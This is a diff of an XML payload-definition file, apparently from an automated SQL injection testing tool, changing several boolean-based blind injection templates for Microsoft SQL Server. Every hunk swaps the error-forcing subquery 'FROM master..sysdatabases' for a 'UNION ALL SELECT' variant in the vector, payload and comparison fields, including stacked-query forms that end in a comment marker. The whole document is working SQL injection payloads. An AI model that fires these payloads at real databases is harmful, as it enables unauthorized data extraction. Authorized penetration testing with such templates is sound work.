@@ -768,12 +768,12 @@ Tag: <test>
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -789,12 +789,12 @@ Tag: <test>
         <risk>1</risk>
         <clause>1,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -1103,12 +1103,12 @@ Tag: <test>
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -1124,12 +1124,12 @@ Tag: <test>
         <risk>1</risk>
         <clause>3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))</comparison>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -1366,13 +1366,13 @@ Tag: <test>
         <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)</vector>
+        <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</vector>
         <request>
-            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)</payload>
+            <payload>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</payload>
             <comment>--</comment>
         </request>
         <response>
-            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END)</comparison>
+            <comparison>;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)</comparison>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
